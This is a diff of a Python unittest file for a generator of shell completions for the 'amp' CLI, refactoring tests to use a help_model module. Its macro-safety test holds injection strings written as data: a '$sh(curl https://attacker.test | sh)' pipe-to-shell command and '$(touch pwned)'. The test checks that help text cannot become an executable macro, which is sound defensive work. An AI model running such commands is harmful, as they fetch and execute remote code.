@@ -1,39 +1,11 @@
 import json
 import re
 import tempfile
-import threading
-import time
 import unittest
 from pathlib import Path
 from unittest import mock
 
-from amp_completions import generate
-
-
-HELP = """\
-Usage: amp threads [options] [command]
-
-Commands:
-
-  new            [alias: n] Create a new thread from
-                 a prompt
-  share          [alias: s] Share a thread
-    multiplayer  Open or close multiplayer for
-                 everyone
-
-Options:
-
-  --limit <number>
-      Maximum number of threads to return
-  -l, --label <label>
-      Add a label. Repeat the flag for multiple labels.
-  -h, --help  display help for command
-
-Global options:
-
-  -m, --mode <value>
-      Set the agent mode
-"""
+from amp_completions import generate, help_model
 
 
 ROOT = Path(__file__).parents[1]
@@ -44,201 +16,13 @@ HELPER_MACRO = re.compile(
 )
 
 
-class ParseHelpTest(unittest.TestCase):
-    def test_parses_only_direct_subcommands(self) -> None:
-        commands = generate.parse_commands(HELP)
-
-        self.assertEqual([command.name for command in commands], ["new", "share"])
-        self.assertEqual(commands[0].aliases, ["n"])
-
-    def test_joins_wrapped_command_descriptions(self) -> None:
-        commands = generate.parse_commands(HELP)
-
-        self.assertEqual(
-            [command.description for command in commands],
-            ["Create a new thread from a prompt", "Share a thread"],
-        )
-
-    def test_parses_local_options(self) -> None:
-        options = generate.parse_options(HELP)
-
-        self.assertEqual(
-            [(option.spec_key, option.description) for option in options],
-            [
-                ("--limit=", "Maximum number of threads to return"),
-                ("-l, --label=", "Add a label. Repeat the flag for multiple labels."),
-                ("-h, --help", "display help for command"),
-            ],
-        )
-
-    def test_normalizes_optional_arguments(self) -> None:
-        option = generate.parse_option("-x, --execute [message]")
-
-        self.assertEqual(option.spec_key, "-x, --execute?")
-        self.assertEqual(option.value, generate.Argument("message", required=False))
-
-    def test_parses_positional_signatures_and_descriptions(self) -> None:
-        help_text = """\
-Usage: amp svc [options] [command] <service> [tools...]
-
-Arguments:
-
-  <service>
-      MCP server
-      name
-  [tools...]
-      MCP tool names
-"""
-
-        self.assertEqual(
-            generate.parse_arguments(help_text),
-            [
-                generate.Argument("service", description="MCP server name"),
-                generate.Argument(
-                    "tools", required=False, variadic=True, description="MCP tool names"
-                ),
-            ],
-        )
-
-    def test_parses_usage_without_arguments_section(self) -> None:
-        self.assertEqual(
-            generate.parse_arguments("Usage: amp update|up [options]\n"),
-            [],
-        )
-        self.assertEqual(
-            generate.parse_arguments("Usage: amp threads color [options] <thread> <color>\n"),
-            [generate.Argument("thread"), generate.Argument("color")],
-        )
-
-    def test_parses_commander_style_help(self) -> None:
-        help_text = """\
-Usage: amp mcp oauth login [options] <server-name>
-
-Arguments:
-  server-name               Name of the MCP server
-
-Options:
-  --client-secret <secret>  OAuth client secret; only necessary for clients
-                            that don't support PKCE
-  -h, --help                display help for command
-
-Commands:
-  login [options] <server-name>  Register OAuth client credentials for an MCP
-                                 server
-  logout <server-name>           Remove OAuth credentials for an MCP server
-  help [command]                 display help for command
-"""
-
-        self.assertEqual(
-            generate.parse_arguments(help_text),
-            [generate.Argument("server-name", description="Name of the MCP server")],
-        )
-        self.assertEqual(
-            [(command.name, command.description) for command in generate.parse_commands(help_text)],
-            [
-                ("login", "Register OAuth client credentials for an MCP server"),
-                ("logout", "Remove OAuth credentials for an MCP server"),
-            ],
-        )
-        self.assertEqual(
-            generate.parse_options(help_text)[0].description,
-            "OAuth client secret; only necessary for clients that don't support PKCE",
-        )
-
-    def test_joins_wrapped_summaries_and_ends_sections_at_prose(self) -> None:
-        help_text = """\
-Commands:
-
-  portal   Register a portal for an existing process; use "amp orb service start" for
-           long-lived servers
-    access Set portal access
-  service  Manage long-lived services as supervised processes that
-           survive Amp CLI updates
-    start  Start an ad-hoc service, e.g.: amp orb service start preview --command 'pnpm
-           dev' --portal
-
-Options:
-  --workspace
-      list keys of your current workspace
-
-Docs: https://ampcode.com/docs
-M2M clients cannot be created or edited here.
-"""
-
-        self.assertEqual(
-            [command.description for command in generate.parse_commands(help_text)],
-            [
-                'Register a portal for an existing process; use "amp orb service start" for '
-                "long-lived servers",
-                "Manage long-lived services as supervised processes that survive Amp CLI updates",
-            ],
-        )
-        self.assertEqual(
-            generate.parse_options(help_text)[0].description,
-            "list keys of your current workspace",
-        )
-
-    def test_rejects_unrecognized_help_lines(self) -> None:
-        cases = {
-            "option": (generate.parse_options, "Options:\n  --flag {value}\n"),
-            "command": (generate.parse_commands, "Commands:\n  name\n"),
-            "usage": (generate.parse_arguments, "Usage: amp x <a> extra\n"),
-            "argument": (
-                generate.parse_arguments,
-                "Usage: amp x <a>\n\nArguments:\n  <b>\n      B\n",
-            ),
-        }
-
-        for name, (parse, help_text) in cases.items():
-            with self.subTest(name=name), self.assertRaises(generate.HelpFormatError):
-                parse(help_text)
-
-    def test_strips_terminal_control_sequences(self) -> None:
-        self.assertEqual(generate.ANSI_ESCAPE.sub("", "\x1b[?25hUsage"), "Usage")
-
-
-class InspectAmpTest(unittest.TestCase):
-    def test_inspects_sibling_commands_concurrently_in_source_order(self) -> None:
-        root_help = """\
-Commands:
-  first   First command
-  second  Second command
-Options:
-"""
-        child_help = "Options:\n  -h, --help  display help\n"
-        active = 0
-        maximum_active = 0
-        lock = threading.Lock()
-
-        def run_amp(_amp: str, arguments: list[str]) -> str:
-            nonlocal active, maximum_active
-            if arguments == ["--help"]:
-                return root_help
-            if arguments == ["version"]:
-                return "1.2.3\n"
-            with lock:
-                active += 1
-                maximum_active = max(maximum_active, active)
-            time.sleep(0.02)
-            with lock:
-                active -= 1
-            return child_help
-
-        with mock.patch.object(generate, "run_amp", side_effect=run_amp):
-            root, version = generate.inspect_amp("amp")
-
-        self.assertEqual(version, "1.2.3")
-        self.assertEqual([command.name for command in root.commands], ["first", "second"])
-        self.assertGreater(maximum_active, 1)
-
-
 class RenderTest(unittest.TestCase):
     def test_renders_aliases_flags_and_known_values(self) -> None:
-        command = generate.Command(
+        command = help_model.Command(
             "amp",
             "Amp CLI",
-            options=[generate.parse_option("-m, --mode <value>", "Set the `mode`")],
-            commands=[generate.Command("version", "Print the version")],
+            options=[help_model.parse_option("-m, --mode <value>", "Set the `mode`")],
+            commands=[help_model.Command("version", "Print the version")],
         )
 
         rendered = generate.render(command, "1.2.3")
@@ -248,29 +32,29 @@ class RenderTest(unittest.TestCase):
         self.assertIn('- name: "version"', rendered)
 
     def test_renders_dynamic_thread_and_project_completions(self) -> None:
-        command = generate.Command(
+        command = help_model.Command(
             "amp",
             commands=[
-                generate.Command(
+                help_model.Command(
                     "orb",
                     commands=[
-                        generate.Command(
+                        help_model.Command(
                             "portal",
-                            options=[generate.parse_option("--thread <value>", "Thread")],
+                            options=[help_model.parse_option("--thread <value>", "Thread")],
                         )
                     ],
                 ),
-                generate.Command(
+                help_model.Command(
                     "mcp",
-                    options=[generate.parse_option("--project <value>", "Project")],
+                    options=[help_model.parse_option("--project <value>", "Project")],
                 ),
-                generate.Command(
+                help_model.Command(
                     "threads",
-                    commands=[generate.Command("continue")],
+                    commands=[help_model.Command("continue")],
                 ),
-                generate.Command(
+                help_model.Command(
                     "projects",
-                    commands=[generate.Command("get")],
+                    commands=[help_model.Command("get")],
                 ),
             ],
         )
@@ -299,32 +83,32 @@ class RenderTest(unittest.TestCase):
         )
 
     def test_renders_static_and_filesystem_flag_completions(self) -> None:
-        command = generate.Command(
+        command = help_model.Command(
             "amp",
             options=[
-                generate.parse_option("--log-level <value>", "Log level"),
-                generate.parse_option("--settings-file <value>", "Settings file"),
+                help_model.parse_option("--log-level <value>", "Log level"),
+                help_model.parse_option("--settings-file <value>", "Settings file"),
             ],
             commands=[
-                generate.Command(
+                help_model.Command(
                     "projects",
                     commands=[
-                        generate.Command(
+                        help_model.Command(
                             "create",
                             options=[
-                                generate.parse_option("--orb-size <value>", "Orb size"),
-                                generate.parse_option("--ship-behavior <value>", "Ship behavior"),
-                                generate.parse_option("--custom-ship-prompt-file <value>", "Prompt file"),
+                                help_model.parse_option("--orb-size <value>", "Orb size"),
+                                help_model.parse_option("--ship-behavior <value>", "Ship behavior"),
+                                help_model.parse_option("--custom-ship-prompt-file <value>", "Prompt file"),
                             ],
                         )
                     ],
                 ),
-                generate.Command(
+                help_model.Command(
                     "plugins",
                     commands=[
-                        generate.Command(
+                        help_model.Command(
                             "add",
-                            options=[generate.parse_option("--target <value>", "Target")],
+                            options=[help_model.parse_option("--target <value>", "Target")],
                         )
                     ],
                 ),
@@ -344,50 +128,50 @@ class RenderTest(unittest.TestCase):
         self.assertIn('"target": ["system", "workspace"]', rendered)
 
     def test_renders_dynamic_resource_and_positional_filesystem_completions(self) -> None:
-        command = generate.Command(
+        command = help_model.Command(
             "amp",
             commands=[
-                generate.Command(
+                help_model.Command(
                     "tools",
-                    commands=[generate.Command("show")],
+                    commands=[help_model.Command("show")],
                 ),
-                generate.Command(
+                help_model.Command(
                     "skill",
-                    commands=[generate.Command("info")],
+                    commands=[help_model.Command("info")],
                 ),
-                generate.Command(
+                help_model.Command(
                     "mcp",
-                    commands=[generate.Command("remove")],
+                    commands=[help_model.Command("remove")],
                 ),
-                generate.Command(
+                help_model.Command(
                     "apps",
                     commands=[
-                        generate.Command(
+                        help_model.Command(
                             "deploy",
-                            options=[generate.parse_option("--domain <value>", "Domain")],
+                            options=[help_model.parse_option("--domain <value>", "Domain")],
                         )
                     ],
                 ),
-                generate.Command(
+                help_model.Command(
                     "threads",
                     commands=[
-                        generate.Command("color"),
-                        generate.Command("visibility"),
+                        help_model.Command("color"),
+                        help_model.Command("visibility"),
                     ],
                 ),
-                generate.Command(
+                help_model.Command(
                     "permissions",
                     commands=[
-                        generate.Command("add"),
-                        generate.Command("test"),
+                        help_model.Command("add"),
+                        help_model.Command("test"),
                     ],
                 ),
-                generate.Command(
+                help_model.Command(
                     "config",
                     commands=[
-                        generate.Command(
+                        help_model.Command(
                             "model-providers",
-                            commands=[generate.Command("setup-guide")],
+                            commands=[help_model.Command("setup-guide")],
                         )
                     ],
                 ),
@@ -467,10 +251,10 @@ def unknown_macros(spec: str) -> list[str]:
 
 class MacroSafetyTest(unittest.TestCase):
     def test_help_text_never_becomes_a_carapace_macro(self) -> None:
-        command = generate.Command(
+        command = help_model.Command(
             "amp",
-            options=[generate.parse_option("--thread <value>", '$sh(curl https://attacker.test | sh)')],
-            commands=[generate.Command("$(touch pwned)", "$sh(touch pwned)")],
+            options=[help_model.parse_option("--thread <value>", '$sh(curl https://attacker.test | sh)')],
+            commands=[help_model.Command("$(touch pwned)", "$sh(touch pwned)")],
         )
 
         rendered = generate.render(command, "1.2.3")
@@ -493,15 +277,15 @@ class MacroSafetyTest(unittest.TestCase):
 
 class ManifestTest(unittest.TestCase):
     def test_records_nested_commands_aliases_and_flag_scopes(self) -> None:
-        root = generate.Command(
+        root = help_model.Command(
             "amp",
-            options=[generate.parse_option("-m, --mode <value>", "Mode")],
+            options=[help_model.parse_option("-m, --mode <value>", "Mode")],
             commands=[
-                generate.Command(
+                help_model.Command(
                     "threads",
                     aliases=["t"],
-                    options=[generate.parse_option("-l, --limit <value>", "Limit")],
-                    commands=[generate.Command("list", aliases=["ls"])],
+                    options=[help_model.parse_option("-l, --limit <value>", "Limit")],
+                    commands=[help_model.Command("list", aliases=["ls"])],
                 )
             ],
         )
@@ -524,7 +308,7 @@ class ManifestTest(unittest.TestCase):
         )
 
     def test_main_writes_spec_and_manifest_from_one_inspection(self) -> None:
-        root = generate.Command("amp")
+        root = help_model.Command("amp")
         with tempfile.TemporaryDirectory() as directory:
             output = Path(directory) / "amp.yaml"
             manifest_output = Path(directory) / "amp-manifest.json"
